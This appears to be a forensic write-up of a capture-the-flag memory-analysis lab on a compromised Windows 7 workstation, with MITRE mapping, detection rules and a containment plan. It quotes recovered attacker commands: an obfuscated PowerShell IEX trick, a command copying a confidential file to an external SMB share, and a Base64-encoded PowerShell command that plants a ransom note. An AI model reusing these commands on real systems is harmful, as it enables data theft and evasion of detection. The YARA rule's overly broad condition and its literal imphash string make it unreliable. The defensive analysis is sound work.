**Classification:** TLP:AMBER  
**Environment / Platform:** Windows 7 SP1 x64 / Volatility Framework 2.6.1 / HTB Sherlock  
**Target:** Workstation USER-PC (IP 192.168.0.104)  

#### 1. Incident Scenario, Context, and Identification

- **Executive Summary:** A physical memory dump (recollection.bin, 4.8 GB) acquired from an unpatched Windows 7 SP1 corporate workstation was processed. Multilayer digital forensics revealed that the host was compromised through a combination of social engineering, downloading typosquatted binary names, in-memory evasion using obfuscated PowerShell, and console-based persistence. The adversary attempted to exfiltrate confidential files to an external SMB network share (\\192.168.0.171\pulice\), staged ransom notes in the system's public profile, and executed a compiled binary matching a known malicious hash.
    
- **Telemetry Sources and Evidence:**
    
    - Physical RAM dump: recollection.bin.
        
    - Triage tool: Volatility 2.6.1 configured with kernel profile Win7SP1x64.
        
    - Applied plugins: imageinfo, pslist, cmdscan, consoles, clipboard, netscan, filescan, dumpfiles, and memdump.
        
    - PE artifact extraction using pefile in Python 3.
        

#### 2. MITRE ATT&CK® Tactical Mapping

| Tactic | Technique / Sub-technique ID | Technique Name | Specific Evidence Found |
|---|---|---|---|
| **Defense Evasion** | T1027 | Obfuscated Files or Information | Obfuscated clipboard command resolving environment variables: (gv '*MDR*').naMe[3,11,2]-joIN''. |
| **Defense Evasion** | T1036.005 | Masquerading: Match Legitimate Name | Downloaded malicious binary mimicking subsystem process: csrsss.exe vs. legitimate csrss.exe. |
| **Exfiltration** | T1048.003 | Exfiltration Over Alternative Protocol: SMB | Exfiltration attempt targeting Confidential.txt via SMB toward \\192.168.0.171\pulice\pass.txt. |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell | PowerShell invocation with Base64-encoded payloads (-e) used to stage ransom notes. |
| **Credential Access** | T1552.001 | Credentials In Files: Browser Data | Localization of cleartext wordlist passwords.txt within the Microsoft Edge directory structure. |

#### 3. Infection Chain and Detailed Forensic Analysis

- **Memory Profile:** Identified via the KDBG block (0xf80002a3f120L) as **Win7SP1x64**. Key validating processes: explorer.exe, dwm.exe, taskhost.exe.
    
- **Memory Capture Timestamp (UTC):** **2022-12-19 16:07:30 UTC**.
    
- **Host and Network Configuration:**
    
    - Local IP Address: **192.168.0.104** (identified via netscan).
        
    - Hostname: **USER-PC** (confirmed via command console history).
        
    - User Accounts on Host: **3** accounts identified through net users execution (Administrator, Guest, user).
        

Inspection of the WinSta0 structure using the clipboard plugin recovered an obfuscated PowerShell fragment stored in plain text (CF_UNI, Handle 0x6b010d):

``` Powershell
(gv '*MDR*').naMe[3,11,2]-joIN''
```

- **Obfuscation Analysis:** The command leverages alias gv (Get-Variable) to query global environment variable names (specifically matching $ExecutionContext). It slices positional character indices [3, 11, 2] from the variable name string, corresponding to letters I, E, X. By concatenating them via -joIN'', it dynamically reconstructs the **Invoke-Expression** cmdlet alias, enabling in-memory execution while evading static string detection.
    

Buffer dumps via cmdscan and consoles revealed active command-line sessions:

1. **Exfiltration Command:**
    
    ``` Cmd
    type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
    ```
    
2. **Success Assessment:** **NO**. Memory console output confirmed the SMB network operation failed with the system error: "The network path was not found", verifying that the target share was unreachable or misconfigured.
    
3. **Ransom Note Deployment:**  
    The adversary executed a Base64-encoded block in PowerShell:
    
    ``` CMD
    powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
    ```
    
    - Decoded String: echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
        
    - Generated File Path: **C:\Users\Public\Office\readme.txt**
        

- **Parent-Child Process Relationships (PPID/PID):**  
    Multiple PowerShell instances were identified. Child instance PID 3532 was spawned directly by the command prompt process PID 4052:
    
    - explorer.exe (PID 2032) -> cmd.exe (PID 4052) -> **powershell.exe (PID 3532)**.
        
    - Parent Process: **cmd.exe**.
        
- **Malware Analysis:**  
    The adversary executed a binary named after its own SHA-256 hash:
    
    - SHA-256 Hash / Filename: **b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1**
        
    - Extraction and Dump: Extracted from memory using dumpfiles -Q 0x11fa45c20.
        
    - **Imphash (Import Hash):** **d3b592cd9481e4f053b5362e22d61595**.
        
    - **Compilation Timestamp (UTC):** **2022-06-22 11:49:04 UTC** (TimeDateStamp in IMAGE_FILE_HEADER).
        
- **Typosquatted File in Downloads:**  
    filescan identified the downloaded binary **csrsss.exe** (\Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe...), masquerading as the core subsystem process csrss.exe.
    
- **Browser Password Dictionary Path:**  
    \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
    

String analysis on the memory dump of the Microsoft Edge process (msedge.exe, PID 2380):

- **Threat Actor Identity:** Facebook authentication telemetry exposed the associated account: **mafia_code1337@gmail.com**.
    
- **SIEM Solution Researched by Victim:** Search query strings (bing.com/search?q=) demonstrated the user was researching the **wazuh** SIEM platform.

``` bash 
# Comandos de extracción forense aplicados en Volatility 2
vol.py -f recollection.bin --profile=Win7SP1x64 clipboard
vol.py -f recollection.bin --profile=Win7SP1x64 consoles
vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x11fa45c20 -D ./dumps
python3 -c "import pefile; pe = pefile.PE('malware.exe'); print('Imphash:', pe.get_imphash())"
```

#### 4. Detection Rules and Security Engineering

``` Yara
rule Malware_Win7_Recollection_b0ad {
    meta:
        description = "Detecta la muestra maliciosa ejecutada en el incidente Recollection"
        author = "Senior DFIR Specialist"
        date = "2026-10-02"
        hash1 = "b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1"
    strings:
        $imphash = "d3b592cd9481e4f053b5362e22d61595"
        $typo = "csrsss.exe" ascii wide nocase
        $note = "hacked by mafia" ascii wide
    condition:
        uint16(0) == 0x5A4D and (any of ($typo, $note) or filesize < 10MB)
}
```

``` SPL
index=sysmon EventCode=1 
| regex Image=".*\\\\[a-fA-F0-9]{64}\.exe" OR Image=".*\\\\csrsss\.exe"
| stats count, values(CommandLine) as Comandos, values(ParentImage) as Padre by Computer, User, Image
| table Computer, User, Image, Comandos, Padre, count
```

#### 5. Containment, Eradication, and Hardening Plan

1. **Logical and Physical Host Isolation:** Immediately disconnect USER-PC (192.168.0.104) from the internal corporate network.
    
2. **Perimeter IOC Blocking:**
    
    - Block outbound network traffic toward IP 192.168.0.171.
        
    - Ingest hash b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1 into EDR and AV blocklists.
        
3. **Decommission End-of-Life (EOL) Systems:** Prioritize the removal and replacement of legacy Windows 7 systems lacking security updates and modern hardware-enforced kernel mitigations (such as Virtualization-based Security and RunAsPPL).
    
4. **Outbound SMB Filtering:** Block outbound SMB traffic toward non-trusted network boundaries (TCP ports 445 and 139) via boundary and local firewalls.